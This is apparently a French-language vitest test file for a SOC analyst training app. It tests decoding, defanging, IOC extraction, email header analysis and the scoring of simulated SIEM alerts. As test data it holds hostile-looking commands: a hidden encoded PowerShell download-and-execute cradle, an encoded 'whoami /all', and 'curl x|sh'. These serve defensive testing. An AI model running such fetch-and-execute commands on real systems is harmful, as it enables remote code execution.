import { describe, expect, it } from 'vitest'
import { cheatEntries } from '../data/cheatSheets'
import { MITRE_TACTICS, techniques } from '../data/mitre'
import { modules } from '../data/modules'
import { playbooks } from '../data/playbooks'
import { CONTAINMENT_ACTIONS, TACTICS, siemAlerts } from '../data/siemAlerts'
import { buildMarkdown } from '../views/ReportGenerator'
import { analyzeHeaders, decodeBase64Auto, defang, encodeUtf16Base64, extractIocs, findIndicators, refang, urlDecode } from './forensics'
import { computeXp, rankFor, RANKS, sanitizeProgress } from './progress'
import { parseModelReport, scoreDecision, verdictClassification } from './scoring'
import { search } from './search'
import { totals } from './totals'

describe('décodage', () => {
  it('décode une charge PowerShell UTF-16LE depuis une ligne de commande', () => {
    const text = "IEX (New-Object Net.WebClient).DownloadString('https://a.example/x')"
    const r = decodeBase64Auto(`powershell.exe -nop -w hidden -enc ${encodeUtf16Base64(text)}`)
    expect(r.text).toBe(text)
    expect(r.encoding).toBe('UTF-16LE')
    expect(r.extractedFromCommandLine).toBe(true)
    expect(findIndicators(r.text)).toContain('Téléchargement distant')
  })

  it('reconnaît un Base64 UTF-8', () => {
    expect(decodeBase64Auto(btoa('hello world')).encoding).toBe('UTF-8')
  })

  it('ne prend pas -Encoding pour une commande encodée', () => {
    expect(() => decodeBase64Auto('powershell.exe -File a.ps1 -Encoding UTF8')).toThrow()
  })

  it('refuse une entrée invalide', () => {
    expect(() => decodeBase64Auto('@@@')).toThrow()
  })
})

describe('defang et refang', () => {
  it('défange URL, IP, email et domaine', () => {
    expect(defang('https://evil-login.example/auth')).toBe('hxxps[://]evil-login[.]example/auth')
    expect(defang('203.0.113.50')).toBe('203[.]0[.]113[.]50')
    expect(defang('a@sub.boite.example')).toBe('a[@]sub[.]boite[.]example')
  })

  it('réarme ce qui a été défangé', () => {
    for (const v of ['https://login.m365.example/a?b=1', '203.0.113.50', 'contact@boite.example']) {
      expect(refang(defang(v))).toBe(v)
    }
  })
})

describe('extraction d’IOC', () => {
  const iocs = extractIocs(`WINWORD.EXE lance powershell.exe et ouvre Facture.docm
hxxps[://]cdn-sync[.]example/a.ps1 203.0.113[.]50 10.0.0.1
compta[@]fournisseur.example
5d41402abc4b2a76b9719d911017c592
9f2c6a1e7b4d0c83a5e16d2f4b98c07a3d1e5f60b7c2849ae03d6f1c5b72e8d4 CVE-2017-11882`)

  it('réarme avant d’extraire', () => {
    expect(iocs.urls).toEqual(['https://cdn-sync.example/a.ps1'])
    expect(iocs.ipv4).toEqual(['203.0.113.50', '10.0.0.1'])
    expect(iocs.emails).toEqual(['compta@fournisseur.example'])
    expect(iocs.md5).toHaveLength(1)
    expect(iocs.sha256).toHaveLength(1)
    expect(iocs.cves).toEqual(['CVE-2017-11882'])
  })

  it('ne confond pas les noms de fichiers avec des domaines', () => {
    expect(iocs.domains).toEqual(['cdn-sync.example', 'fournisseur.example'])
  })
})

describe('analyse d’en-têtes', () => {
  const report = analyzeHeaders(`Received: from mx.contoso.example (mx.contoso.example [192.0.2.25])
        by mail.contoso.example; Thu, 12 Mar 2026 08:41:12 +0000
Received: from relay.example (unknown [203.0.113.45])
        by mx.contoso.example; Thu, 12 Mar 2026 08:41:10 +0000
Authentication-Results: mx.contoso.example;
        spf=softfail smtp.mailfrom=relay.example;
        dkim=none;
        dmarc=fail header.from=contoso-rh.example
From: "RH" <rh@contoso-rh.example>
Return-Path: <b@relay.example>
Reply-To: <x@autre.example>`)

  it('lit les Received de bas en haut', () => {
    expect(report.hops[0].ip).toBe('203.0.113.45')
    expect(report.hops[1].ip).toBe('192.0.2.25')
    expect(report.originIp).toBe('203.0.113.45')
  })

  it('lit SPF, DKIM et DMARC et signale les écarts', () => {
    expect([report.spf, report.dkim, report.dmarc]).toEqual(['softfail', 'none', 'fail'])
    expect(report.findings.some((f) => f.text.includes('Reply-To'))).toBe(true)
    expect(report.findings.some((f) => f.text.includes('Return-Path'))).toBe(true)
  })
})

describe('alertes du simulateur', () => {
  it('compte 8 tickets avec les trois verdicts', () => {
    expect(siemAlerts).toHaveLength(8)
    expect(new Set(siemAlerts.map((a) => a.solution.classification))).toEqual(new Set(['TP', 'FP', 'B-TP']))
    expect(new Set(siemAlerts.map((a) => a.id)).size).toBe(8)
  })

  it.each(siemAlerts.map((a) => [a.id, a] as const))('%s : solution cohérente et rapport modèle à 100/100', (_id, alert) => {
    const s = alert.solution
    const actionIds = CONTAINMENT_ACTIONS.map((a) => a.id)
    s.tactics.forEach((t) => expect(TACTICS).toContain(t))
    ;[...s.actions, ...(s.partialActions ?? [])].forEach((a) => expect(actionIds).toContain(a))
    const report = parseModelReport(s.modelReport)
    Object.values(report).forEach((v) => expect(v).not.toBe(''))
    const score = scoreDecision(alert, { classification: s.classification, tactic: s.tactics[0], action: s.actions[0], report })
    expect(score.report.keywordsMissing).toEqual([])
    expect(score.total).toBe(100)
  })

  it('un rapport vide et de mauvais choix donnent zéro', () => {
    const empty = { qui: '', quoi: '', quand: '', ou: '', pourquoi: '', verdict: '' }
    const score = scoreDecision(siemAlerts[0], { classification: 'FP', tactic: 'Impact', action: 'close-admin', report: empty })
    expect(score.total).toBe(0)
  })

  it('la charge du ticket macro se décode vraiment', () => {
    const log = siemAlerts[0].logs[0].content
    const line = log.split('\n').find((l) => l.includes('CommandLine=powershell')) ?? ''
    expect(decodeBase64Auto(line).text).toContain('cdn-sync-update.example')
  })
})

describe('intégrité du contenu', () => {
  it('compte 7 modules complets', () => {
    expect(modules).toHaveLength(7)
    for (const m of modules) {
      expect(m.sections.length).toBeGreaterThan(2)
      expect(m.cheatSheet.length).toBeGreaterThan(0)
      expect(m.quiz.length).toBeGreaterThanOrEqual(7)
      for (const q of m.quiz) {
        expect(q.answer).toBeGreaterThanOrEqual(0)
        expect(q.answer).toBeLessThan(q.options.length)
      }
    }
  })

  it('compte 5 playbooks complets', () => {
    expect(playbooks).toHaveLength(5)
    for (const b of playbooks) {
      expect(b.phases.map((p) => p.name)).toContain('Identification')
      expect(b.phases.map((p) => p.name)).toContain('Confinement')
      expect(b.phases.map((p) => p.name)).toContain('Éradication')
      expect(b.phases.map((p) => p.name)).toContain('Clôture')
    }
  })

  it('couvre chaque tactique MITRE avec des requêtes KQL et SPL', () => {
    for (const t of MITRE_TACTICS) expect(techniques.filter((x) => x.tactic === t).length).toBeGreaterThanOrEqual(3)
    for (const t of techniques) {
      expect(t.kql.length).toBeGreaterThan(20)
      expect(t.spl.length).toBeGreaterThan(20)
    }
    expect(new Set(techniques.map((t) => t.id)).size).toBe(techniques.length)
  })

  it('n’utilise que des identifiants de cheat sheet uniques par catégorie', () => {
    const keys = cheatEntries.map((e) => `${e.category}-${e.id}`)
    expect(new Set(keys).size).toBe(keys.length)
  })
})

describe('recherche', () => {
  it.each(['4624', '4769', '1102', 'Sysmon 10', '445', 'certutil', 'T1003.006'])('trouve %s en premier résultat', (q) => {
    expect(search(q)[0].label.toLowerCase()).toContain(q.toLowerCase())
  })

  it('renvoie une liste vide si rien ne correspond', () => {
    expect(search('zzzzqqq')).toEqual([])
    expect(search('   ')).toEqual([])
  })
})

describe('progression', () => {
  const empty = { coursesRead: {}, quizBest: {}, alerts: {}, playbookSteps: {}, labMissions: [] }

  it('démarre au rang N1 à 0 XP', () => {
    expect(computeXp(empty, totals)).toBe(0)
    expect(rankFor(0).rank.name).toBe('Analyste Junior N1')
  })

  it('permet d’atteindre SOC Lead en complétant le parcours', () => {
    const full = {
      coursesRead: Object.fromEntries(modules.map((m) => [m.id, m.sections.map((s) => s.id)])),
      quizBest: Object.fromEntries(modules.map((m) => [m.id, 100])),
      alerts: Object.fromEntries(siemAlerts.map((a) => [a.id, 100])),
      playbookSteps: Object.fromEntries(playbooks.map((b) => [b.id, Array.from({ length: totals.stepsByPlaybook[b.id] }, (_, i) => String(i))])),
      labMissions: ['decode', 'defang', 'iocs', 'headers'],
    }
    const xp = computeXp(full, totals)
    expect(xp).toBe(2650)
    expect(rankFor(xp).rank.name).toBe(RANKS.at(-1)?.name)
  })
})

describe('défauts trouvés par les scénarios réalistes', () => {
  it('ne prend pas les comptes, le code et les fichiers pour des domaines', () => {
    const iocs = extractIocs('CONTOSO\\j.martin lance Net.WebClient, DeviceDetail.browser, lusrmgr.msc et a.docx.lockd vers evil.example et fr.wikipedia.org')
    expect(iocs.domains).toEqual(['evil.example', 'fr.wikipedia.org'])
  })

  it('aucun ticket ne produit de faux domaine', () => {
    for (const alert of siemAlerts) {
      const { domains } = extractIocs(alert.logs.map((l) => l.content).join('\n'))
      expect(domains.filter((d) => !d.endsWith('.example') && !d.includes('contoso'))).toEqual([])
    }
  })

  it('défanger deux fois ne change rien', () => {
    const once = defang('https://evil.example/a contact@x.example 203.0.113.50')
    expect(defang(once)).toBe(once)
  })

  it('ne défange ni les comptes ni les chemins', () => {
    const text = 'C:\\Users\\j.martin\\Facture.docm Net.WebClient'
    expect(defang(text)).toBe(text)
  })

  it('décode les formes -EncodedCommand: et les carets de cmd.exe', () => {
    const b64 = encodeUtf16Base64('whoami /all')
    expect(decodeBase64Auto(`powershell -EncodedCommand:${b64}`).text).toBe('whoami /all')
    expect(decodeBase64Auto(`p^owershell -e^nc ${b64}`).text).toBe('whoami /all')
  })

  it('décode une URL malgré un % isolé', () => {
    expect(urlDecode('remise 100% sur /admin%20login')).toBe('remise 100% sur /admin login')
  })

  it('ignore le corps du mail et lit Received-SPF', () => {
    const body = analyzeHeaders('From: a@x.example\n\nReply-To: b@y.example\nReceived: from z ([203.0.113.66]) by corps')
    expect(body.replyTo).toBeUndefined()
    expect(body.hops).toHaveLength(0)
    expect(analyzeHeaders('Received-SPF: Fail (domaine non autorisé)').spf).toBe('fail')
  })

  it('attribue à un relais l’IP de l’expéditeur, pas celle du serveur qui reçoit', () => {
    expect(analyzeHeaders('Received: from a.example by mx.example (10.167.8.10) with SMTP').hops[0].ip).toBeUndefined()
  })

  it('détecte un verdict écrit contraire à la classification', () => {
    expect(verdictClassification('Vrai positif bénin, clôture')).toBe('B-TP')
    expect(verdictClassification('Ce n’est pas un faux positif : vrai positif')).toBe('TP')
    expect(verdictClassification('Clôture du ticket')).toBeNull()
    const alert = siemAlerts.find((a) => a.id === 'ALR-1045')!
    const base = { classification: 'TP', tactic: 'Impact', action: 'crisis' }
    const honest = scoreDecision(alert, { ...base, report: parseModelReport(alert.solution.modelReport) })
    const liar = scoreDecision(alert, { ...base, report: { ...parseModelReport(alert.solution.modelReport), verdict: 'Faux positif, je clôture.' } })
    expect(honest.report.verdictConflict).toBe(false)
    expect(liar.report.verdictConflict).toBe(true)
    expect(liar.total).toBeLessThan(honest.total)
  })

  it('aucun rapport modèle ne contredit sa propre classification', () => {
    for (const alert of siemAlerts) {
      expect(verdictClassification(parseModelReport(alert.solution.modelReport).verdict)).toBe(alert.solution.classification)
    }
  })

  it('une sauvegarde abîmée donne une progression saine', () => {
    for (const raw of [null, [1, 2], 'x', { alerts: null, labMissions: null }, { alerts: 'x', labMissions: { a: 1 }, coursesRead: 7, quizBest: { a: 'beaucoup', b: 999 } }]) {
      expect(computeXp(sanitizeProgress(raw), totals)).toBe(0)
    }
    expect(sanitizeProgress({ quizBest: { a: 80 }, labMissions: ['decode', 3] })).toMatchObject({ quizBest: { a: 80 }, labMissions: ['decode'] })
  })

  it('la longueur d’une réponse de quiz ne trahit pas la bonne réponse', () => {
    const questions = modules.flatMap((m) => m.quiz)
    const longest = questions.filter((q) => q.options[q.answer].length === Math.max(...q.options.map((o) => o.length)))
    expect(longest.length / questions.length).toBeLessThan(0.4)
  })

  it('le tableau du rapport résiste aux | et aux sauts de ligne', () => {
    const md = buildMarkdown({ id: '', title: '', analyst: '', severity: 'Haute', verdict: 'TP', tlp: 'TLP:RED', qui: 'a\nb', quoi: 'curl x|sh', quand: '', ou: '', pourquoi: '', timeline: '', iocSource: '', mitre: [], actions: '', recommendations: '' })
    expect(md).toContain('| **Qui** | a<br>b |')
    expect(md).toContain('| **Quoi** | curl x\\|sh |')
  })

  it('la recherche trouve aussi le contenu des cours et des playbooks', () => {
    expect(search('éradication').length).toBeGreaterThan(0)
    expect(search('4624')[0].label).toBe('4624')
  })
})
